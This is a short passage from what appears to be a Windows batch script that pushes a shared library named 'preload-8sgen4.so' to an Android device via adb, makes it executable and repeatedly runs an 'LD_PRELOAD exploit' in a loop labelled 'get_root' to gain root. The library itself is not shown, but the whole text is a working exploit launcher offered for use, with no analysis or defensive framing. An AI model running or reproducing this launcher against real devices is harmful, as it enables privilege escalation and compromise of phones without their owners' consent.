...
echo [*] Pushing preload-8sgen4.so to device...
adb push preload-8sgen4.so /data/local/tmp/preload-8sgen4.so

echo [*] Setting permissions...
adb shell chmod 755 /data/local/tmp/preload-8sgen4.so

set "count=0"
:get_root
set /a count+=1
echo [*] Executing LD_PRELOAD exploit (Attempt !count!/30)...
adb shell "LD_PRELOAD=/data/local/tmp/preload-8sgen4.so id"
